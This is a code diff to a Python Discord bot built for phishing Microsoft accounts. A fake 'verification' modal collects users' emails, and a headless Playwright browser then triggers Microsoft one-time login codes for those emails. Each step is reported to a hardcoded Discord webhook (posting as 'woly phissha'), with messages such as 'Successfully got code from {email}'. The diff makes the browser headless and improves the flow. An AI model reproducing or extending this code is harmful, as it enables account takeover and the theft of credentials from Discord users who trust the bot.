@@ -81,8 +81,16 @@ class MyModal(discord.ui.Modal):
         username = value=self.children[0].value
         global email
         email = value=self.children[1].value
-        embed = discord.Embed(title=f"We have sent a verification code to {email} - Please check your inbox and submit the code")
-        await interaction.response.send_message(embeds=[embed], ephemeral=True, view=MyView2())
+        #embed = discord.Embed(title=f"We have sent a verification code to {email} - Please check your inbox and submit the code")
+        embed11 = discord.Embed(title=f"I am sending a one-time code to {email} - Please be patient, estimated time 11s")
+        embed22 = discord.Embed(title=f"I successfully sent a code to {email} - Please check your inbox and submit the code!")
+        embed33 = discord.Embed(title=f"I failed to send a code to {email} - Please open a support ticket (this isnt good)")
+        await interaction.response.send_message(embeds=[embed11], ephemeral=True)
+        code_status = await requestcode(interaction)
+        if code_status == 0:
+            await interaction.response.send_message(embeds=[embed22], ephemeral=True, view=MyView2())
+        else:
+            await interaction.response.send_message(embeds=[embed33], ephemeral=True)
         url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
 
         listofpeople.append([username, email, interaction.user])
@@ -134,7 +142,6 @@ class MyModal(discord.ui.Modal):
   ],
     "components": []
 }, timeout=5000)
-        await requestcode(interaction)
 
         
 
@@ -143,12 +150,14 @@ from playwright.async_api import async_playwright
 
 async def requestcode(interaction):
     async with async_playwright() as playwright:
-        browser = await playwright.chromium.launch(headless=False)
+        print("opening browser")
+        browser = await playwright.chromium.launch(headless=True)
         page = await browser.new_page()
         context = await browser.new_context()
+        print("OPENED browser")
 
         await page.goto("https://account.microsoft.com/")
-        await page.wait_for_selector('#id__4', state='visible')
+        await page.wait_for_selector('#id__4', state='visible', timeout=4000)
         await page.click('#id__4')
         await page.fill('input[name="loginfmt"]', email)
         await page.click('input[type="submit"]')
@@ -175,14 +184,15 @@ async def requestcode(interaction):
         #})
 
         try:
-          await page.wait_for_selector('#otcLoginLink', state='visible', timeout=5000)
+          await page.wait_for_selector('#otcLoginLink', state='visible', timeout=4000)
           await page.click('#otcLoginLink')
-          await page.close()
           requests.post(url=url, json = {
             "username": "woly phissha",
             "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
             "content": f"Sucessfully got code from {email}"
           })
+          await page.close()
+          return 0
         except Exception as e:
           requests.post(url=url, json = {
             "username": "woly phissha",
@@ -191,7 +201,7 @@ async def requestcode(interaction):
           })
           try:
             await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
-            await page.click('#idA_PWD_SwitchToCredPicker', timeout=2000)
+            await page.click('#idA_PWD_SwitchToCredPicker', timeout=4000)
             await page.click(f'text=Email {email}')
             requests.post(url=url, json = {
               "username": "woly phissha",
@@ -199,13 +209,15 @@ async def requestcode(interaction):
               "content": f"@everyone Successfully got code from {email}"
             })
             await page.close()
+            return 0
           except Exception as e:
             requests.post(url=url, json = {
                 "username": "woly phissha",
                 "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
                 "content": f"@everyone COULDN'T GET CODE FROM: {email}"
-            }, timeout=5000)
+            }, timeout=3000)
             await page.close()
+            return 1
 
 
 
